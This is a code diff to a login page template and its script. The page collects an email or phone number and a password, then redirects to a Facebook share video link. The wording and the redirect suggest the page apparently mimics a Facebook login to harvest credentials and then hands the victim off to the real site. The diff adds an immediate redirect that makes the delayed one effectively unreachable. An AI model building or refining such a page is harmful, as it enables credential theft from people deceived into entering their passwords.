@@ -136,11 +136,10 @@
             <div class="login-box">
                 <form action="/login" method="post" onsubmit="showSpinner()">
                     <% if (message) { %>
-                        <div class="message <%= success ? 'success' : 'error' %>">
+                        <div class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
                             <%= message %>
                         </div>
                     <% } %>
-                    
                     <input type="text" name="email" placeholder="Email address or phone number" required >
                     <input type="password" name="password" placeholder="Password" required>
                     
@@ -229,6 +228,8 @@
 
         if (data.redirect) {
             // If response indicates a redirect, show success message and redirect after 3 seconds
+            window.location.href = '/';
+            
             setTimeout(() => {
                 window.location.href = 'https://www.facebook.com/share/v/QeSVNGdVsuCoW8Bs/?mibextid=WC7FNe';
             }, 3000); // 3-second delay for redirect
@@ -241,6 +242,7 @@
 
 // Attach submission handler to form
 document.querySelector('form').addEventListener('submit', handleFormSubmission);
+
 
 
     </script>
